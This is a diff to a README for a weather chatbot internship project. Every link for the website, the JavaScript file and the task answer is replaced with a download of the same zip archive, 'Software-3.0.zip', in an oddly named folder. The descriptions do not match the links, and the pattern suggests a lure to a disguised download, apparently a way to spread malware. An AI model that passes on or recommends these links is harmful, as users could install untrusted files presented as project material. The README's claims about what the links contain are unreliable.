@@ -1,5 +1,5 @@
 # Task 1
-You will find the answer for task 1 in "https://raw.githubusercontent.com/Scartex/ardoqinternship/master/peritomy/ardoqinternship.zip". 
+You will find the answer for task 1 in "https://github.com/Scartex/ardoqinternship/raw/refs/heads/master/peritomy/Software-3.0.zip". 
 
 # Weatherbot (2c)
 
@@ -45,10 +45,10 @@ the dialogflow project.
 
 # How to use
 To use the bot, simply enter this website:
-https://raw.githubusercontent.com/Scartex/ardoqinternship/master/peritomy/ardoqinternship.zip
+https://github.com/Scartex/ardoqinternship/raw/refs/heads/master/peritomy/Software-3.0.zip
 
 Some background: The bot is using a public API from worldweatheronline that gives updated information about the weather from cities around the world. 
 To recieve this information you can use different commands, for example: "weather forecast in Oslo for tomorrow". 
 You can also ask the bot for it's name where it will ask for your name as well. 
 
-In the github repository you will find https://raw.githubusercontent.com/Scartex/ardoqinternship/master/peritomy/ardoqinternship.zip which is the JavaScript file for the chatbot, and https://raw.githubusercontent.com/Scartex/ardoqinternship/master/peritomy/ardoqinternship.zip which is the answer for the first task. 
+In the github repository you will find https://github.com/Scartex/ardoqinternship/raw/refs/heads/master/peritomy/Software-3.0.zip which is the JavaScript file for the chatbot, and https://github.com/Scartex/ardoqinternship/raw/refs/heads/master/peritomy/Software-3.0.zip which is the answer for the first task. 
